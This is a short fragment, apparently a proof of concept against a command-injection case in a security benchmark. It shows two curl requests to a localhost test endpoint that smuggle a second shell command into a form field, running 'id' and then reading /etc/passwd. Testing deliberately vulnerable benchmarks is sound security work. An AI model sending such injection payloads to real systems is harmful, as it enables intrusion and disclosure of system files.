curl -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00168' \
  -d 'BenchmarkTest00168=hello%20%26%26%20id'

Or more impactfully:
curl -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00168' \
  -d 'BenchmarkTest00168=hello%20%26%26%20cat%20/etc/passwd%20%23'